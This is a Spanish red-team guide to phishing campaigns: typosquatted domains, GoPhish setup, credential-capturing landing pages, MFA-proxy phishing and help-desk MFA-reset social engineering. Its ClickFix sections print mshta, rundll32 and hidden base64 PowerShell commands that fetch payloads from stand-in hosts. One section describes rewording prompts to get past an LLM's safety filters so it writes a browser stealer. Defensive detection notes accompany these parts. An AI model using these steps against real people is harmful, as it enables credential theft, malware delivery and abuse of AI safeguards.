# Metodología de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Reconocer a la víctima
1. Seleccionar el **dominio de la víctima**.
2. Realizar una enumeración web básica **buscando portales de inicio de sesión** utilizados por la víctima y **decidir** cuál se va a **suplantar**.
3. Utilizar **OSINT** para **encontrar correos electrónicos**.
2. Preparar el entorno
1. **Comprar el dominio** que se va a utilizar para la evaluación de phishing
2. **Configurar los registros relacionados con el servicio de correo electrónico** (SPF, DMARC, DKIM, rDNS)
3. Configurar el VPS con **gophish**
3. Preparar la campaña
1. Preparar la **plantilla de correo electrónico**
2. Preparar la **página web** para robar las credenciales
4. ¡Lanzar la campaña!

## Generar nombres de dominio similares o comprar un dominio de confianza

### Técnicas de variación de nombres de dominio

- **Keyword**: El nombre de dominio **contiene una **keyword** importante** del dominio original (p. ej., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdominio con guion**: Cambiar el **punto por un guion** de un subdominio (p. ej., www-zelster.com).
- **Nuevo TLD**: El mismo dominio utilizando un **TLD nuevo** (p. ej., zelster.org)
- **Homoglyph**: **Reemplaza** una letra del nombre de dominio por **letras que parecen similares** (p. ej., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Intercambia dos letras** dentro del nombre de dominio (p. ej., zelsetr.com).
- **Singularization/Pluralization**: Añade o elimina la “s” al final del nombre de dominio (p. ej., zeltsers.com).
- **Omission**: **Elimina una** de las letras del nombre de dominio (p. ej., zelser.com).
- **Repetition:** **Repite una** de las letras del nombre de dominio (p. ej., zeltsser.com).
- **Replacement**: Como Homoglyph, pero menos sigiloso. Reemplaza una de las letras del nombre de dominio, posiblemente por una letra cercana a la letra original en el teclado (p. ej., zektser.com).
- **Subdomained**: Introduce un **punto** dentro del nombre de dominio (p. ej., ze.lster.com).
- **Insertion**: **Inserta una letra** en el nombre de dominio (p. ej., zerltser.com).
- **Missing dot**: Añade el TLD al nombre de dominio (p. ej., zelstercom.com)

**Herramientas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sitios web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe la **posibilidad de que algunos bits almacenados o en comunicación se inviertan automáticamente** debido a diversos factores, como llamaradas solares, rayos cósmicos o errores de hardware.

Cuando este concepto se **aplica a las solicitudes DNS**, es posible que el **dominio recibido por el servidor DNS** no sea el mismo que el solicitado inicialmente.

Por ejemplo, una modificación de un solo bit en el dominio "windows.com" puede cambiarlo a "windnws.com."

Los atacantes pueden **aprovecharse de esto registrando múltiples dominios de bit-flipping** similares al dominio de la víctima. Su intención es redirigir a usuarios legítimos a su propia infraestructura.

Para obtener más información, lee [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Comprar un dominio de confianza

Puedes buscar en [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio expirado que puedas utilizar.\
Para asegurarte de que el dominio expirado que vas a comprar **ya tiene un buen SEO**, puedes comprobar cómo está categorizado en:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descubrir correos electrónicos

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100 % gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descubrir más** direcciones de correo electrónico válidas o **verificar las que** ya has descubierto, puedes comprobar si puedes hacerles fuerza bruta en los servidores SMTP de la víctima. [Aprende a verificar/descubrir direcciones de correo electrónico aquí](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Además, no olvides que, si los usuarios utilizan **algún portal web para acceder a sus correos**, puedes comprobar si es vulnerable a la **fuerza bruta de nombres de usuario** y explotar la vulnerabilidad si es posible.

## Configuración de GoPhish

### Instalación

Puedes descargarlo desde [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Descárgalo y descomprímelo dentro de `/opt/gophish` y ejecuta `/opt/gophish/gophish`\
Se te proporcionará una contraseña para el usuario administrador en el puerto 3333 en la salida. Por lo tanto, accede a ese puerto y utiliza esas credenciales para cambiar la contraseña del administrador. Es posible que tengas que tunelizar ese puerto a local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuración

**Configuración del certificado TLS**

Antes de este paso, deberías haber **comprado ya el dominio** que vas a utilizar, y este debe estar **apuntando** a la **IP del VPS** donde estás configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuración del correo**

Comienza instalando: `apt-get install postfix`

Luego añade el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia también los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finalmente, modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** con el nombre de tu dominio y **reinicia tu VPS.**

Ahora, crea un **registro DNS A** de `mail.<domain>` que apunte a la **dirección IP** del VPS y un **registro DNS MX** que apunte a `mail.<domain>`

Ahora probemos a enviar un correo electrónico:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuración de Gophish**

Detén la ejecución de gophish y configúralo.\
Modifica `/opt/gophish/config.json` de la siguiente manera (observa el uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar el servicio gophish**

Para crear el servicio gophish, de modo que pueda iniciarse automáticamente y administrarse como un servicio, puedes crear el archivo `/etc/init.d/gophish` con el siguiente contenido:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Termina de configurar el servicio y compruébalo haciendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuración del servidor de correo y del dominio

### Espera y sé legítimo

Cuanto más antiguo sea un dominio, menos probable será que se marque como spam. Por lo tanto, debes esperar el mayor tiempo posible (al menos 1 semana) antes de realizar el phishing assessment. Además, si publicas una página sobre un sector de buena reputación, la reputación obtenida será mejor.

Ten en cuenta que, aunque tengas que esperar una semana, puedes terminar de configurar todo ahora.

### Configura el registro DNS inverso (rDNS)

Configura un registro rDNS (PTR) que resuelva la dirección IP del VPS al nombre de dominio.

### Registro Sender Policy Framework (SPF)

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS).

![Formulario de SPF Wizard para generar un registro SPF para un dominio de phishing](<../../images/image (1037).png>)

Este es el contenido que debe establecerse dentro de un registro TXT del dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Tienes que crear un nuevo registro DNS TXT que apunte al hostname `_dmarc.<domain>` con el siguiente contenido:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Debes **configurar un DKIM para el nuevo dominio**. Si no sabes qué es un registro DMARC, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial se basa en: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Debes concatenar ambos valores B64 que genera la clave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Prueba la puntuación de configuración de tu correo electrónico

Puedes hacerlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Solo accede a la página y envía un correo electrónico a la dirección que te proporcionen:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
También puedes **comprobar la configuración de tu correo electrónico** enviando un correo a `check-auth@verifier.port25.com` y **leyendo la respuesta** (para ello tendrás que **abrir** el puerto **25** y ver la respuesta en el archivo _/var/mail/root_ si envías el correo como root).\
Comprueba que superas todas las pruebas:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
También podrías enviar un **mensaje a un Gmail bajo tu control** y comprobar los **encabezados del correo** en tu bandeja de entrada de Gmail; `dkim=pass` debería estar presente en el campo de encabezado `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Eliminación de la lista negra de Spamhaus

La página [www.mail-tester.com](https://www.mail-tester.com) puede indicarte si Spamhaus está bloqueando tu dominio. Puedes solicitar que eliminen tu dominio/IP en: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Eliminación de la lista negra de Microsoft

​​Puedes solicitar que eliminen tu dominio/IP en [https://sender.office.com/](https://sender.office.com).

## Crear y lanzar una campaña de GoPhish

### Perfil de envío

- Establece algún **nombre para identificar** el perfil del remitente
- Decide desde qué cuenta vas a enviar los correos de phishing. Sugerencias: _noreply, support, servicedesk, salesforce..._
- Puedes dejar en blanco el nombre de usuario y la contraseña, pero asegúrate de marcar **Ignorar errores de certificado**

![Crear y lanzar una campaña de GoPhish - Perfil de envío: Puedes dejar en blanco el nombre de usuario y la contraseña, pero asegúrate de marcar Ignorar errores de certificado](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Se recomienda utilizar la funcionalidad "**Enviar correo electrónico de prueba**" para comprobar que todo funciona correctamente.\
> Recomendaría **enviar los correos electrónicos de prueba a direcciones de correo de 10min** para evitar entrar en una lista negra al realizar las pruebas.

### Plantilla de correo electrónico

- Establece algún **nombre para identificar** la plantilla
- Después, escribe un **asunto** (nada extraño, solo algo que esperarías leer en un correo electrónico normal)
- Asegúrate de haber marcado "**Agregar imagen de seguimiento**"
- Escribe la **plantilla del correo electrónico** (puedes utilizar variables como en el siguiente ejemplo):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Ten en cuenta que **para aumentar la credibilidad del correo electrónico**, se recomienda utilizar alguna firma de un correo electrónico del cliente. Sugerencias:

- Envía un correo electrónico a una **dirección inexistente** y comprueba si la respuesta contiene alguna firma.
- Busca **correos electrónicos públicos** como info@ex.com, press@ex.com o public@ex.com, envíales un correo y espera la respuesta.
- Intenta contactar con algún correo electrónico **válido descubierto** y espera la respuesta.

![Sending Profile - Email Template: Intenta contactar con algún correo electrónico válido descubierto y espera la respuesta](<../../images/image (80).png>)

> [!TIP]
> Email Template también permite **adjuntar archivos para enviar**. Si también quieres robar desafíos NTLM utilizando archivos o documentos especialmente diseñados [lee esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Establece un **nombre**
- **Escribe el código HTML** de la página web. Ten en cuenta que puedes **importar** páginas web.
- Marca **Capture Submitted Data** y **Capture Passwords**
- Establece una **redirección**

![Email Template - Landing Page: Marca Capture Submitted Data y Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente tendrás que modificar el código HTML de la página y realizar algunas pruebas en local (quizá utilizando algún servidor Apache) **hasta que te gusten los resultados.** Después, escribe ese código HTML en el cuadro.\
> Ten en cuenta que, si necesitas **utilizar recursos estáticos** para el HTML (quizá algunas páginas CSS y JS), puedes guardarlos en _**/opt/gophish/static/endpoint**_ y acceder a ellos desde _**/static/\<filename>**_

> [!TIP]
> Para la redirección, podrías **redirigir a los usuarios a la página web principal legítima** de la víctima o redirigirlos, por ejemplo, a _/static/migration.html_, mostrar algún **indicador de carga (**[**https://loading.io/**](https://loading.io)**) durante 5 segundos y después indicar que el proceso se realizó correctamente**.

### Users & Groups

- Establece un nombre
- **Importa los datos** (ten en cuenta que, para utilizar el template del ejemplo, necesitas el nombre, apellido y dirección de correo electrónico de cada usuario)

![Landing Page - Users & Groups: Importa los datos (ten en cuenta que, para utilizar el template del ejemplo, necesitas el nombre, apellido y dirección de correo electrónico de cada usuario)](<../../images/image (163).png>)

### Campaign

Por último, crea una campaña seleccionando un nombre, el email template, la landing page, la URL, el sending profile y el grupo. Ten en cuenta que la URL será el enlace enviado a las víctimas.

Ten en cuenta que el **Sending Profile permite enviar un correo electrónico de prueba para comprobar cómo se verá el correo de phishing final**:

![Users & Groups - Campaign: Ten en cuenta que el Sending Profile permite enviar un correo electrónico de prueba para comprobar cómo se verá el correo de phishing final](<../../images/image (192).png>)

Una vez que todo esté listo, ¡lanza la campaña!

## Website Cloning

Si por algún motivo quieres clonar el sitio web, consulta la siguiente página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

En algunas evaluaciones de phishing (principalmente para Red Teams), también querrás **enviar archivos que contengan algún tipo de backdoor** (quizá un C2 o simplemente algo que active una autenticación).\
Consulta la siguiente página para ver algunos ejemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Mediante Proxy MitM

El ataque anterior es bastante ingenioso, ya que estás falsificando un sitio web real y recopilando la información introducida por el usuario. Desafortunadamente, si el usuario no introdujo la contraseña correcta o si la aplicación que falsificaste está configurada con 2FA, **esta información no te permitirá suplantar la identidad del usuario engañado**.

Aquí es donde herramientas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) y [**muraena**](https://github.com/muraenateam/muraena) resultan útiles. Esta herramienta te permitirá generar un ataque similar a MitM. Básicamente, los ataques funcionan de la siguiente manera:

1. **Suplantas el formulario de inicio de sesión** de la página web real.
2. El usuario **envía** sus **credenciales** a tu página falsa y la herramienta las envía a la página web real, **comprobando si las credenciales funcionan**.
3. Si la cuenta está configurada con **2FA**, la página MitM lo solicitará y, cuando el **usuario lo introduzca**, la herramienta lo enviará a la página web real.
4. Una vez autenticado el usuario, tú, como atacante, habrás **capturado las credenciales, el 2FA, la cookie y cualquier información** de cada interacción mientras la herramienta realiza un MitM.

### Mediante VNC

¿Qué pasaría si, en lugar de **enviar a la víctima a una página maliciosa** con el mismo aspecto que la original, la enviaras a una **sesión VNC con un navegador conectado a la página web real**? Podrás ver lo que hace, robar la contraseña, el MFA utilizado, las cookies...\
Puedes hacerlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Obviamente, una de las mejores formas de saber si te han descubierto es **buscar tu dominio en blacklists**. Si aparece incluido, de algún modo tu dominio fue detectado como sospechoso.\
Una forma sencilla de comprobar si tu dominio aparece en alguna blacklist es utilizar [https://malwareworld.com/](https://malwareworld.com)

Sin embargo, existen otras formas de saber si la víctima está **buscando activamente actividad de phishing sospechosa en Internet**, como se explica en:


{{#ref}}
detecting-phising.md
{{#endref}}

Puedes **comprar un dominio con un nombre muy similar** al dominio de la víctima **y/o generar un certificado** para un **subdominio** de un dominio controlado por ti que **contenga** la **palabra clave** del dominio de la víctima. Si la **víctima** realiza algún tipo de **interacción DNS o HTTP** con ellos, sabrás que **está buscando activamente** dominios sospechosos y tendrás que actuar de forma muy sigilosa.<sup>[[2]](#references)</sup>

### Evaluar el phishing

Utiliza [**Phishious** ](https://github.com/Rices/Phishious)para evaluar si tu correo electrónico acabará en la carpeta de spam o si será bloqueado o tendrá éxito.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Los intrusion sets modernos omiten cada vez más los señuelos por correo electrónico y **atacan directamente el flujo de trabajo del service desk / recuperación de identidad** para evadir MFA. El ataque se basa completamente en técnicas "living-off-the-land": una vez que el operador obtiene credenciales válidas, se desplaza utilizando herramientas administrativas integradas; no se necesita malware.<sup>[[6]](#references)</sup>

### Attack flow
1. Reconocimiento de la víctima
* Recopila detalles personales y corporativos de LinkedIn, data breaches, GitHub público, etc.
* Identifica identidades de alto valor (directivos, personal de IT y finanzas) y enumera el **proceso exacto del help desk** para restablecer la contraseña o MFA.
2. Ingeniería social en tiempo real
* Llama por teléfono, Teams o chat al help desk mientras suplantas al objetivo (a menudo con **caller-ID spoofing** o **voz clonada**).
* Proporciona la PII recopilada anteriormente para superar la verificación basada en conocimientos.
* Convence al agente para que **restablezca el secreto MFA** o realice un **SIM-swap** en un número de móvil registrado.
3. Acciones inmediatas posteriores al acceso (≤60 min en casos reales)
* Establece un punto de apoyo a través de cualquier portal web de SSO.
* Enumera AD / AzureAD con herramientas integradas (sin desplegar binarios):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Realiza movimiento lateral con **WMI**, **PsExec** o agentes **RMM** legítimos ya incluidos en la whitelist del entorno.

### Detection & Mitigation
* Trata la recuperación de identidad del help desk como una **operación privilegiada**: exige autenticación step-up y aprobación del manager.
* Implementa reglas de **Identity Threat Detection & Response (ITDR)** / **UEBA** que generen alertas ante:
* Cambio del método MFA + autenticación desde un dispositivo o ubicación geográfica nuevos.
* Elevación inmediata del mismo principal (usuario-→-administrador).
* Graba las llamadas al help desk y exige una **devolución de llamada a un número ya registrado** antes de realizar cualquier restablecimiento.
* Implementa **Just-In-Time (JIT) / Privileged Access** para que las cuentas recién restablecidas **no hereden automáticamente tokens con privilegios elevados**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Los grupos de malware comunes compensan el coste de las operaciones dirigidas con ataques masivos que convierten los **motores de búsqueda y las redes publicitarias en el canal de distribución**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** coloca un resultado falso como `chromium-update[.]site` en la parte superior de los anuncios de búsqueda.
2. La víctima descarga un pequeño **first-stage loader** (a menudo JS/HTA/ISO). Ejemplos observados por Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. El loader extrae las cookies del navegador y las bases de datos de credenciales, y después descarga un **silent loader** que decide, *en tiempo real*, si desplegar:
* RAT (por ejemplo, AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistencia (clave Run del registro + tarea programada)

### Consejos de hardening
* Bloquea dominios registrados recientemente y aplica **Advanced DNS / URL Filtering** también a los *search ads*, además del correo electrónico.
* Restringe la instalación de software a paquetes MSI firmados o de Store; deniega la ejecución de `HTA`, `ISO` y `VBS` mediante políticas.
* Supervisa los procesos secundarios de los navegadores que abren instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Busca LOLBins utilizados habitualmente de forma abusiva por first-stage loaders (por ejemplo, `regsvr32`, `curl`, `mshta`).

### Secuestro del clic en el botón de descarga con transferencia a un TDS
Algunos portales de software falsos mantienen el `href` de descarga visible apuntando a la URL **real** de GitHub/release, pero secuestran la **primera** interacción del usuario mediante JavaScript y envían a la víctima a una cadena de **Traffic Distribution System (TDS)** en su lugar.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Rasgos clave:
- El hook normalmente se ejecuta en la **fase de captura** (`true`) sobre `document`, por lo que se activa antes que los handlers del sitio.
- Chrome suele utilizar `mousedown` en lugar de `click` para mantener la redirección vinculada a un **gesto de usuario** válido y mejorar la evasión del bloqueo de ventanas emergentes.
- Algunas variantes abren previamente `about:blank` o generan clics en elementos `<a target="_blank">` y solo después asignan la URL del TDS.
- Los límites del lado del navegador suelen almacenarse en `localStorage`, por lo que el **primer clic** puede llegar al malware, mientras que las actualizaciones o reintentos posteriores vuelven al enlace visible de apariencia legítima.
- El TDS puede filtrar por referrer, dominio de entrada, GEO, fingerprint del navegador/dispositivo, comprobaciones de VPN/datacenter, contexto del clic y contadores por sesión, lo que hace que las reproducciones del analista sean no deterministas.

Ideas para defenders:
- Comparar el `href` **mostrado** con el destino de navegación **real** generado en el momento del clic.
- Buscar handlers `document.addEventListener(..., true)` que llamen tanto a `preventDefault()` como a `stopImmediatePropagation()` alrededor de `window.open`, `about:blank` o clics sintéticos en anchors.
- Tratar los grupos de dominios de descarga de software recién registrados que cargan el mismo stage de CloudFront/JS como un patrón de SEO-poisoning/TDS de alta señal.

### ClickFix desde páginas de verificación falsas + fetches de LOLBAS con apariencia de archivos comprimidos
Algunas ramas del TDS terminan en una página de verificación falsa (con estilo Cloudflare/IUAM) que indica a la víctima que ejecute un binario de Windows de confianza, como:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notas:
- `mshta.exe` ejecuta el **HTA/VBScript al inicio de la respuesta**, aunque la URL simule ser un archivo `.7z`; los datos de archivo añadidos pueden ser un señuelo puro.
- Las etapas posteriores suelen seguir mintiendo sobre el tipo de archivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs con binarios rellenados) y después cambian a **mapeo manual de PE / ejecución en memoria**.
- Si estás respondiendo a una de estas cadenas, conserva la **red + memoria desde la primera ejecución exitosa**: las repeticiones posteriores pueden mostrar únicamente una ruta benigna de instalador/SFX o fallar porque la liberación del payload/clave estaba vinculada a la sesión TDS original.

### Tradecraft de entrega de DLL mediante ClickFix (actualización falsa de CERT)
* Señuelo: aviso clonado de un CERT nacional con un botón de **Update** que muestra instrucciones paso a paso para “solucionarlo”. Se indica a las víctimas que ejecuten un batch que descarga una DLL y la ejecuta mediante `rundll32`.<sup>[[12]](#references)</sup>
* Cadena de batch típica observada:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deposita el payload en `%TEMP%`, una breve espera oculta la variación de la red y después `rundll32` llama al entrypoint exportado (`notepad`).
* La DLL envía un beacon con la identidad del host y consulta al C2 cada pocos minutos. Las tareas remotas llegan como **PowerShell codificado en base64**, ejecutado oculto y con bypass de políticas:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Esto conserva la flexibilidad del C2 (el servidor puede cambiar las tareas sin actualizar la DLL) y oculta las ventanas de consola. Busca procesos PowerShell hijos de `rundll32.exe` que utilicen conjuntamente `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Los defensores pueden buscar callbacks HTTP(S) con el formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de consulta de 5 minutos después de cargar la DLL.

---

## Operaciones de Phishing mejoradas con AI
Los atacantes ahora encadenan **APIs de LLM y clonación de voz** para crear señuelos completamente personalizados e interactuar en tiempo real.

| Capa | Ejemplo de uso por parte del threat actor |
|-------|-------------|
|Automatización|Generar y enviar >100 k emails / SMS con redacción aleatoria y links de tracking.|
|IA generativa|Producir emails *únicos* que hagan referencia a operaciones públicas de M&A y bromas internas de redes sociales; voz deepfake del CEO en una estafa de callback.|
|IA agéntica|Registrar dominios, recopilar inteligencia de fuentes abiertas y redactar de forma autónoma los emails de la siguiente etapa cuando una víctima hace clic pero no envía sus credenciales.|

**Defensa:**
• Añadir **banners dinámicos** que destaquen los mensajes enviados desde automatización no confiable (mediante anomalías de ARC/DKIM).
• Implementar **frases de desafío biométricas de voz** para solicitudes telefónicas de alto riesgo.
• Simular continuamente señuelos generados por AI en los programas de concienciación: las plantillas estáticas están obsoletas.

Ver también: abuso de la navegación agéntica para credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Ver también: abuso de AI agents sobre herramientas CLI locales y MCP (para inventario y detección de secretos):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Ensamblaje en runtime de JavaScript de phishing asistido por LLM (codegen de código en el navegador)

Los atacantes pueden distribuir HTML de apariencia benigna y **generar el stealer en runtime** solicitando JavaScript a una **API de LLM confiable** y ejecutándolo en el navegador (por ejemplo, mediante `eval` o `<script>` dinámico).<sup>[[8]](#references)</sup>

1. **Prompt como ofuscación:** codificar las URLs de exfil/Base64 en el prompt; iterar la redacción para evadir los filtros de seguridad y reducir las alucinaciones.
2. **Llamada a la API desde el cliente:** al cargarse, JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; solo el prompt/la llamada a la API están presentes en el HTML estático.
3. **Ensamblar y ejecutar:** concatenar la respuesta y ejecutarla (polimórfica en cada visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** el código generado personaliza el señuelo (p. ej., el análisis de tokens de LogoKit) y publica las credenciales en el endpoint oculto en el prompt.

**Rasgos de evasión**
- El tráfico llega a dominios conocidos de LLM o a proxies de CDN reputados; a veces mediante WebSockets hacia un backend.
- No existe un payload estático; el JS malicioso solo existe después del renderizado.
- Las generaciones no deterministas producen **stealers únicos** por sesión.

**Ideas de detección**
- Ejecutar sandboxes con JS habilitado; marcar la **creación de `eval`/scripts dinámica en runtime originada en respuestas de LLM**.
- Buscar POSTs del front-end hacia APIs de LLM seguidos inmediatamente por `eval`/`Function` sobre el texto devuelto.
